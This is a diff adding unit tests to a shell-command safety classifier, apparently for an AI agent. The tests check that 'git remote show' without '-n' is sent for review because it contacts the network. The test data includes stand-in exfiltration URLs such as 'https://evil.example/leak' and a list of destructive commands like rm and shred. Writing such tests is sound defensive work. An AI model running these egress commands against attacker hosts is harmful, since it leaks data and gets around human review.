@@ -414,6 +414,30 @@ describe('classifyShellCommandSafety', () => {
     expect(await classifyShellCommandSafety(command)).toBe('read-only');
   });
 
+  describe('git remote show network egress (#14359)', () => {
+    // `git remote show` queries the remote (git-upload-pack) unless `-n` is
+    // given, so without that flag it must not auto-run as read-only.
+    it.each([
+      'git remote show origin',
+      'git remote show',
+      'git remote show https://evil.example/leak',
+      'git remote show http://127.0.0.1:8973/leak',
+      'git remote show ssh://evil.example/repo',
+      'git remote show git@evil.example:owner/repo',
+    ])('routes %j to review instead of auto-running it', async (command) => {
+      expect(await classifyShellCommandSafety(command)).toBe('unknown');
+      expect(await isShellCommandReadOnlyAST(command)).toBe(false);
+    });
+
+    it.each([
+      'git remote show -n origin',
+      'git remote show -n https://evil.example/leak',
+      'git remote get-url origin',
+    ])('keeps %j read-only', async (command) => {
+      expect(await classifyShellCommandSafety(command)).toBe('read-only');
+    });
+  });
+
   it.each([
     ...'chgrp chmod chown cp install ln mkdir mkfifo mknod mv rename rm rmdir shred touch truncate unlink'
       .split(' ')
